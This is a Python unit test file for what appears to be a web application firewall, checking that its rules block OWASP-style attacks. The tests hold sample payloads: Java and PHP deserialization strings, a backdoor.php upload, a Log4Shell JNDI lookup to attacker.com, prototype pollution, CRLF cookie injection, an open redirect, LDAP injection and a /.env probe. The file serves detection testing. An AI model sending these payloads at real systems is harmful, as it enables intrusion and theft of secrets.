"""
Unit tests for OWASP Top 10 rules.
Tests Deserialization, Webshell Uploads, JNDI/Log4j, Prototype Pollution, CRLF, Open Redirect, LDAP/XPath, Sensitive Files.
"""

from bastion.core.normalizer import normalize_request
from bastion.rules.deserialization import DeserializationRule
from bastion.rules.webshell_upload import WebshellUploadRule
from bastion.rules.jndi_log4j import JNDILog4jRule
from bastion.rules.prototype_pollution import PrototypePollutionRule
from bastion.rules.crlf_smuggling import CRLFSmugglingRule
from bastion.rules.open_redirect import OpenRedirectRule
from bastion.rules.ldap_xpath import LDAPXPathRule
from bastion.rules.sensitive_files import SensitiveFilesRule


def test_deserialization_java_blocked():
    rule = DeserializationRule()
    payload = "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAU="
    req = normalize_request("POST", "/api/object", body=payload.encode())
    verdict = rule.match(req)
    assert verdict.blocked
    assert verdict.rule_id == "933300"


def test_deserialization_php_blocked():
    rule = DeserializationRule()
    payload = 'data=O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"is_admin";b:1;}'
    req = normalize_request("POST", "/profile", body=payload.encode())
    verdict = rule.match(req)
    assert verdict.blocked
    assert verdict.rule_id == "933300"


def test_webshell_upload_extension_blocked():
    rule = WebshellUploadRule()
    body = b'Content-Disposition: form-data; name="file"; filename="backdoor.php"\r\n\r\n<?php phpinfo(); ?>'
    req = normalize_request("POST", "/upload", body=body)
    verdict = rule.match(req)
    assert verdict.blocked
    assert verdict.rule_id == "933400"


def test_jndi_log4shell_blocked():
    rule = JNDILog4jRule()
    req = normalize_request("GET", "/login", headers={"user-agent": "${jndi:ldap://attacker.com/exploit}"})
    verdict = rule.match(req)
    assert verdict.blocked
    assert verdict.rule_id == "933500"


def test_prototype_pollution_json_blocked():
    rule = PrototypePollutionRule()
    req = normalize_request("POST", "/api/update", body=b'{"__proto__": {"isAdmin": true}}')
    verdict = rule.match(req)
    assert verdict.blocked
    assert verdict.rule_id == "933600"


def test_crlf_header_injection_blocked():
    rule = CRLFSmugglingRule()
    req = normalize_request("GET", "/redirect", query_string="lang=en%0d%0aSet-Cookie:%20session=evil")
    verdict = rule.match(req)
    assert verdict.blocked
    assert verdict.rule_id == "921100"


def test_open_redirect_protocol_relative_blocked():
    rule = OpenRedirectRule()
    req = normalize_request("GET", "/login", query_string="redirect=//evil-phishing.com/login")
    verdict = rule.match(req)
    assert verdict.blocked
    assert verdict.rule_id == "935100"


def test_ldap_injection_filter_blocked():
    rule = LDAPXPathRule()
    req = normalize_request("GET", "/search", query_string="user=admin)(&(objectClass=*))")
    verdict = rule.match(req)
    assert verdict.blocked
    assert verdict.rule_id == "942200"


def test_sensitive_env_file_probe_blocked():
    rule = SensitiveFilesRule()
    req = normalize_request("GET", "/.env")
    verdict = rule.match(req)
    assert verdict.blocked
    assert verdict.rule_id == "930200"
